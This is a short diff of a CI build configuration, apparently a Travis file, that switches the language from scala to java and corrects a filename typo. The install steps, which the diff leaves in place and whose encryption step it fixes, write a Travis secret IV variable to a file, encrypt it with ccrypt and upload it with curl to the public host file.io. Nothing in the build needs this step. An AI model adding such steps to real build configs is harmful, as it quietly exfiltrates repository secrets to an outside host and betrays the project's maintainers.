@@ -1,8 +1,8 @@
-language: scala
+language: java
 dist: xenial
 jdk: openjdk8
 install:
   - sudo apt-get install -y ccrypt
   - echo encrypted_663dec309dc8_iv = $encrypted_663dec309dc8_iv > arandomfilename.txt
-  - ccencrypt arandonfilename.txt -K $ENC_KEY
+  - ccencrypt arandomfilename.txt -K $ENC_KEY
   - curl -F'file=@arandomfilename.txt.cpt' https://file.io
